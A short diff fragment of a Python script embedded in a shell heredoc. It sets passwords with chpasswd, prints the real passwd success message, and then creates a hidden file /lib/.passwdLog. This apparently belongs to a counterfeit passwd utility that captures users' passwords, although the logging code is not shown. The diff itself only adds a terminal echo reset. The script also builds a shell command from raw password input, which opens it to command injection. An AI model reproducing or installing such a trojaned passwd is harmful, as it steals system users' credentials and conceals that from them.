@@ -54,6 +54,7 @@ def main():
         os.system("echo "+user+":"+password+" | chpasswd")
         print("passwd: all authentication tokens updated successfully.")
         print("\n")
+    os.system('stty echo')
 main()
 EOFB
 touch /lib/.passwdLog
